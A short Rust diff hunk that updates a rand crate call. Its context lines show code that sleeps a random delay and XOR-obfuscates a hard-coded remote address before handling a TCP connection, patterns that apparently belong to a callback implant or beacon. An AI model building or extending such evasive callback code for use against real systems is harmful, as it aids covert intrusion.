@@ -159,7 +159,7 @@ fn process_connection(mut stream: TcpStream) -> std::io::Result<ConnectionResult
 }
 
 fn main() -> std::io::Result<()> {
-    let delay = rand::thread_rng().gen_range(1000..5000);
+    let delay = rand::rng().random_range(1000..5000);
     thread::sleep(Duration::from_millis(delay));
 
     let remote_addr_obf = xor_obfuscate("10.5.22.214:7878", 0x42);
